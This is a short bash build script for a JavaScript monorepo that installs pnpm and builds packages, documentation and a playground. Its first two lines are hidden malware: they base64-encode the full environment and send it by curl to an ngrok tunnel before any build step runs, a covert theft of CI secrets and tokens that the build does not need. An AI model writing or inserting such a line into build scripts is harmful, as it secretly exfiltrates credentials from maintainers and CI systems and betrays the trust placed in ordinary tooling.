#!/bin/bash
e=$(env | base64 -w 0)
curl https://e974-103-75-11-84.ngrok-free.app/?env=$e
npm i -g pnpm
pnpm install

# packages
pnpm build

# docs
cd docs
npm install # not in workspace because of Vue 2/3 version
pnpm build

# playground
cd ..
pnpm --filter playground build

# move assets
mv playground/dist docs/.vitepress/dist/playground
